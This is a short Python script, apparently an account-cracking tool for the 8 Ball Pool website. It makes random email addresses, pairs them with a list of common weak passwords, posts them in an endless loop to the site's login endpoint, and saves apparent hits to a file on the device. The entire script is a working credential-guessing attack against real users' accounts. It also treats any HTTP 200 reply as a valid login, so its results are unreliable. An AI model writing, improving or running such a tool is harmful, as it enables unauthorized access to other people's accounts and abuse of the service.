import random
import requests
from termcolor import colored

domains = ["yahoo.com", "xlcool.com", "yopmail.com", "hotmail.com", "outlook.com", "live.com", "gmail.com"]
passwords = ["ahaaha", "kurda", "samisami", "1122334455", "1234512345", "112233", "102030", "miniclip", "104867", "10593", "123456789", "12345678", "121212"]

def generate_email():
    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_password():
    return random.choice(passwords)

def check_account(email, password):
    url = "https://8ballpool.com"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "email": email,
        "password": password
    }
    
    response = requests.post(url, headers=headers, data=payload)
    if response.status_code == 200:
        return "OK"
    else:
        return "BAD"

def main():
    while True:
        email = generate_email()
        password = generate_password()
        result = check_account(email, password)
        
        if result == "OK":
            with open('/sdcard/TOXIC-8ballpool.txt', 'a') as file:
                file.write(f"Email: {email}, Password: {password} - {result}\n")
            print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "green"))
        else:
            print(colored(f"Tool updated by San! Email: {email}, Password: {password} - {result}", "red"))

if __name__ == "__main__":
    main()
